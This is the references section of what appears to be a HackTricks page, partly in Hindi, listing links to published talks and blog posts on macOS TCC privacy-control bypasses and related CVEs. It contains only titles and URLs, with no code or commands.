- [12] [OBTS v5.0: "आपके Mac पर होने वाली बातें Apple's iCloud पर ही रहती हैं?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [नई macOS vulnerability, "powerdir," unauthorized user data access की वजह बन सकती है](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Home directory बदलना और TCC bypass करना, aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Music चलाना और TCC bypass करना, aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - macOS में Telegram के साथ TCC bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Apple Vulnerabilities को उजागर करना: diskarbitrationd और storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
